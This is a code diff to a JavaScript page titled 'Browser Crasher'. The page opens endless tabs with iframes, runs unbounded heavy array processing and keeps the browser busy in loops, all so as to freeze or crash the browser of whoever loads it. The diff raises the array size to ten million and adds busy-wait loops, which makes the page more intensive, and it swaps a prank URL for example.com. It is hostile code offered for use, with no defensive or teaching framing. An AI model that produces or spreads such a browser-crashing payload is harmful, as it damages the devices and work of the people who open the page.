@@ -8,7 +8,7 @@
         // Function to open infinite tabs with infinite iframes
         function openInfiniteTabs() {
             while (true) {
-                var url = 'https://www.urmom.com'; // Replace with your desired URL
+                var url = 'https://www.example.com'; // Replace with your desired URL
                 var win = window.open('', '_blank');
                 var htmlContent = '<!DOCTYPE html><html><head><title>Browser Crasher</title></head><body>';
                 
@@ -27,7 +27,7 @@
         // Function to perform heavy data processing
         function processData() {
             while (true) {
-                var arraySize = 1000000;
+                var arraySize = 10000000; // Increased array size for more intensive processing
                 var data = [];
                 
                 for (var i = 0; i < arraySize; i++) {
@@ -74,9 +74,9 @@
         // Additional lag-inducing operations
         function induceLag() {
             while (true) {
-                for (var i = 0; i < 1000; i++) {
-                    Math.random(); // Intensive computation
-                }
+                // Adding a delay to simulate intensive computation
+                var start = Date.now();
+                while (Date.now() - start < 1000) {}
             }
         }
 
